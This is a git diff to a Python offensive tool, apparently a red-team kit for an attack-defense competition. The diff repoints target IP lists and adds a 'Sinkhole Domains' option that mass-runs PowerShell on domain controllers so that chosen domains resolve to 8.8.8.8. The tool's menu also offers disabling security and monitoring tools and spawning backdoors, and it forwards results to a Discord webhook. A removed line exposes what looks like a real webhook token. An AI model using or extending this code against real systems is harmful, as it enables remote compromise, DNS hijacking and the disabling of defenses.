@@ -26,11 +26,16 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # Range for x is 1 to 13 inclusive
 x_range = range(1, 14)
 
-ALL_DC = [f"10.{x}.1.1" for x in x_range]
-ALL_WINRM = [f"10.{x}.1.2" for x in x_range]
-ALL_ICMP = [f"10.{x}.1.3" for x in x_range]
-ALL_SMB = [f"192.168.{x}.3" for x in x_range]
-ALL_IIS = [f"192.168.{x}.4" for x in x_range]
+#ALL_DC = [f"10.{x}.1.1" for x in x_range]
+ALL_DC = ["192.168.1.1"]
+#ALL_WINRM = [f"10.{x}.1.2" for x in x_range]
+ALL_WINRM = []
+#ALL_ICMP = [f"10.{x}.1.3" for x in x_range]
+ALL_ICMP = []
+#ALL_SMB = [f"192.168.{x}.3" for x in x_range]
+ALL_SMB = ["192.168.1.6"]
+#ALL_IIS = [f"192.168.{x}.4" for x in x_range]
+ALL_IIS = []
 
 # Combine all lists into one master host list
 ALL_HOSTS = ALL_DC + ALL_WINRM + ALL_ICMP + ALL_SMB + ALL_IIS
@@ -41,7 +46,7 @@ CONCURRENCY = 8
 THROTTLE_MS = 50
 PWNBOARD_URL = "https://www.pwnboard.win/pwn"
 AUTH_TOKEN = "Bearer AUTH_TOKEN_HERE"  # Replace with your actual token
-WEBHOOK_URL = "https://discord.com/api/webhooks/1458274465229177029/GVQYXo9Ag06A_LmndNouuC1buai6kJiXQhwcxSROHcKmC4gncZ9wXejalP96kqhqnFiz"  # Replace with your actual webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/FULL_WEBHOOK_HERE"  # Replace with your actual webhook URL
 
 # Callback Global Variables
 unprivileged_results = []
@@ -321,6 +326,7 @@ def main_interface():
             Choice(value="IFEO", name="Disable Security & Monitoring Tools"),
             Choice(value="UTILITY", name="Spawn Utility Backdoors"),
             Choice(value="SSH", name="Drop SSH Keys (Coming Soon)"),
+            Choice(value="SINKHOLE", name="Sinkhole Domains"),
             Choice(value="CALLBACK", name="Test Connections"),
             Choice(value="VIEW_CALLBACKS", name="View All Connections"),
             Choice(value=None, name="Exit"),
@@ -1021,8 +1027,10 @@ def singular_execution():
         if log_successful_results:
             fwd_discord(target, response)
 
-def mass_execution(command=None, callback=False):
-    targets = choose_targets()
+def mass_execution(command=None, callback=False, targets=None):
+    if targets == None:
+        targets = choose_targets()
+    print(targets)
     if not targets:
         print("No targets selected")
         return
@@ -1173,6 +1181,21 @@ def main():
             mass_execution(command)
         elif action == "SSH":
             print("SSH Key Dropping coming soon!")
+        elif action == "SINKHOLE":
+            domains = inquirer.text(
+                message="Enter domains to sinkhole using DNS (e.g., github.com,gitlab.com):",
+                style=text_style
+            ).execute()
+            domains = domains.split(",")
+            full_command = ""
+            for domain in domains:
+                command = (
+                    f"powershell -c Add-DnsServerPrimaryZone -Name \"{domain}\" -ReplicationScope \"Domain\" -DynamicUpdate \"None\"; "
+                    f"powershell -c Add-DnsServerResourceRecordA -Name \"*\" -ZoneName \"{domain}\" -IPv4Address \"8.8.8.8\"; "
+                )
+                full_command += command
+            full_command = full_command[:-2]
+            mass_execution(full_command, targets=ALL_DC)
         elif action == "CALLBACK":
             command = "whoami"
             mass_execution(command, callback=True)
